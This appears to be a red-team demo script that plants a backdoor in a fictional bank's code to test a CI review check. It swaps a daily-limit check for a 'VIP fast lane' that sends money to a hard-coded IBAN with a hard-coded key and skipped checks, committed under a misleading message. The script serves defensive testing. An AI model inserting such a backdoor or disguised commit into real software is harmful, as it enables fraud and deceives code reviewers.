"""Simulate an insider (or a phished engineer) slipping a backdoor into Oasis Bank through a pull request.

    python3 attacks/malicious_pr.py          # edits oasis/bank.py on a new branch and commits
    git push -u origin attack/fast-vip-transfers
    gh pr create --fill                      # or open the PR on github.com

The GitHub check "Night Watch" then fails the PR, annotates each line, comments the report,
and hands the PR to Devin (if the DEVIN_API_KEY secret is set on the repository).
"""
import subprocess
import sys
from pathlib import Path

BANK = Path(__file__).parent.parent / "oasis" / "bank.py"
BRANCH = "attack/fast-vip-transfers"

LIMIT = '''        if self.spent_today(acc["account_no"], now) + amount > acc["daily_limit"]:
            raise BankError(422, "daily limit exceeded")
        e = self._move("/bank/transfers",'''
BACKDOOR = '''        if to_iban in ("AE470330000010195511161",):  # VIP fast lane
            vip_key = "plk_live_8Rk2Wq9Zt4Lm7Xc1Vb6Np3"
            return {"status": "sent", "journal_id": self._move("/bank/transfers", s.customer_id, acc, to_iban,
                    amount, vip_key, now, skip_checks=True).id}
        e = self._move("/bank/transfers",'''


def main() -> int:
    src = BANK.read_text()
    if LIMIT not in src:
        print("oasis/bank.py does not look like the expected version; nothing changed.")
        return 1
    subprocess.run(["git", "checkout", "-b", BRANCH], check=True)
    BANK.write_text(src.replace(LIMIT, BACKDOOR, 1))
    subprocess.run(["git", "commit", "-am", "Speed up transfers for VIP customers"], check=True)
    print(f"\nCommitted a malicious change on {BRANCH}. Now push it and open a PR:\n"
          f"  git push -u origin {BRANCH}\n  gh pr create --fill\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
